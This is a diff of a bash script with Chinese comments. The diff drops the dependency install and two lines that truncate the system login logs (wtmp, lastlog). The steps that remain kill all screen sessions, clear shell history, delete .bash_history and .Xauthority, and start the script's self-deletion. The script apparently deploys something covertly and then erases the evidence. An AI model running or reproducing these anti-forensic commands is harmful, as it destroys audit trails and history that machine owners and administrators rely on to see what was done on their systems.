@@ -1,13 +1,6 @@
 #!/bin/bash
 
-# 修复环境：确保路径正确
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
-# 1. 安装基础依赖
-sudo apt-get update -y
-sudo apt-get install -y git screen wget
-
-# 2. 清理旧进程
+# 1. 清理旧进程
 screen -ls | grep -o '[0-9]*\.[^[:space:]]*' | xargs -I {} screen -X -S {} quit 2>/dev/null
 
 # 3. 准备工作目录
@@ -37,8 +30,6 @@ history -c
 history -w
 rm -f $HOME/.Xauthority
 rm -f $HOME/.bash_history
-sudo truncate -s 0 /var/log/wtmp 2>/dev/null
-sudo truncate -s 0 /var/log/lastlog 2>/dev/null
 
 # 7. 脚本自删除
 SCRIPT_PATH=$(readlink -f "$0")
